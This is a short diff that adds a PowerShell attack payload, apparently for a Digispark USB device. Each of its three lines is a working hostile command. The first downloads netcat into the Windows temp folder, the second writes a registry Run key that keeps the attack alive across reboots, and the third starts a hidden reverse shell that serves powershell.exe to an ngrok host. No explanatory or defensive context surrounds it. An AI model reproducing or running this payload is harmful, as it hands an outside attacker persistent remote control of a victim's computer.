@@ -1,0 +1,3 @@
+Invoke-WebRequest https://github.com/tomiodarim/Digispark/blob/main/payloads/netcat.exe?raw=true -o C:\Windows\Temp\nc.exe
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v persist /d "powershell -c \`"C:\Windows\Temp\nc.exe -ArgumentList '-e powershell.exe','0.tcp.sa.ngrok.io ','16392' -WindowStyle Hidden\`" "
+Start-Process 'C:\Windows\Temp\nc.exe' -ArgumentList '-e powershell.exe','0.tcp.sa.ngrok.io ','16392' -WindowStyle Hidden
